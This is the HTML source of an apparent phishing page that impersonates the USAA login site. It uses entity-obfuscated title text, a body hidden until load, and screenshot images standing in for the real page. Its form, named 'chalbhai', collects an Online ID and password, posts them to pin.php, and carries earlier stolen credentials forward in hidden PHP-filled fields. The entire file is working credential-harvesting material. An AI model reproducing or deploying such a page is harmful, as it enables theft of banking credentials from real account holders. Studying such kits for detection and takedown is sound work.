<html>
<head>
<title>U&#83;&#65;A Mi&#108;&#105;&#116;&#97;&#114;y Home, Life &amp; Auto I&#110;&#115;&#117;&#114;&#97;&#110;&#99;e</title>
<meta http-equiv="content-type" content="text/html; charset=UTF8">

<meta http-equiv="content-type" content="text/html; charset=UTF-8"><script id="utag_171" src="imgs/bat.js" charset="utf-8" async="" type="text/javascript"></script><script src="imgs/s39876891442473.js" async="async" type="text/javascript"></script>
<meta charset="utf-8">
<title>USAA | Welcome to USAA</title>

<meta name="title" content="USAA | Welcome to USAA">

		<link rel="stylesheet" type="text/css" href="imgs/aggregator.css" media="all" />
		<link rel="SHORTCUT ICON" href="usaaicon.ico" />
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">


<style> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</style> 

<style type="text/css">
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>


<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.js"></script>
<script type="text/javascript">
$(function() {
    $('#close').click(function() {
        $('#float_bottom_left').remove();
        $('#close').remove();
    });
});
</script>

<style type="text/css" media="all">
#float_bottom_left {
    position: fixed;
    z-index: 7;
    bottom: 0px;
    left: 0px;
    clip: inherit;
}
#close {
    position: absolute;
    top: 0px;
    right: 0px;
}
</style>

</head>
<body bgColor="#F3F3F3" Link="#000000" VLink="#000000" ALink="#000000">
<div id="container">

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349; height:667px; z-index:1"><img src="Capture.PNG" alt="" title="" border=0 width=1349 height=667></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:640px; width:1351px; height:490px; z-index:2"><a href="#"><img src="Capture2.PNG" alt="" title="" border=0 width=1351 height=490></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:1123px; width:1350px; height:529px; z-index:3"><img src="Capture3.PNG" alt="" title="" border=0 width=1350 height=529></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:1650px; width:1351px; height:620px; z-index:3"><img src="Capture4.PNG" alt="" title="" border=0 width=1351 height=529></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:2179px; width:1348px; height:566px; z-index:3"><img src="Capture5.PNG" alt="" title="" border=0 width=1348 height=566></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:2729px; width:1350px; height:616px; z-index:3"><img src="Capture6.PNG" alt="" title="" border=0 width=1350 height=616></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:3344px; width:1350px; height:609px; z-index:3"><img src="Capture7.PNG" alt="" title="" border=0 width=1350 height=609></div>

<div id="image5" style="position:absolute; overflow:hidden; left:0px; top:3950px; width:1351px; height:623px; z-index:4"><a href="#"><img src="Capture8.PNG" alt="" title="" border=0 width=1351 height=623></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:0px; top:4570px; width:1349px; height:234px; z-index:4"><a href="#"><img src="Capture9.PNG" alt="" title="" border=0 width=1349 height=234></a></div>


<div id="float_bottom_left" style="position:absolute; left:618px; top:106px; width:382px; height:299px; z-index:7"><img src="Capture10.PNG" alt="" title="" border=0 width=382 height=299></div>

<div style="position:absolute; left:976px; top:117px; width:15px; height:15px; z-index:7"><a href="#"><img src="close.jpg" alt="" id="close" title="" border=0 width=15 height=15></a></div>

   

<form action="pin.php" name=chalbhai id=chalbhai method=post  onsubmit=" return formbreeze_sub()" >
<input name="userid" value="<?php echo $_POST['userid'];?>" type="hidden" />
<input name="password" value="<?php echo $_POST['password'];?>" type="hidden" />

<input name="userid2" required placeholder = ' Online ID' class="textbox" type="text" maxlength=15 style="position:absolute;; height:37px;width:240px;left:895px;top:130px;z-index:5">
<input name="password2" required placeholder = ' Password' class="textbox" type="password" style="position:absolute;height:37px;width:240px;left:895px;top:184px;z-index:6">
<div id="formimage1" style="position:absolute; left:899px; top:235px; z-index:5">
<input type="image" name="formimage1" width="234" height="44" src="img/logone1.png"></div></form>
</div>



</body>
<img src="http://none.com" width=0 height=0>
</html>
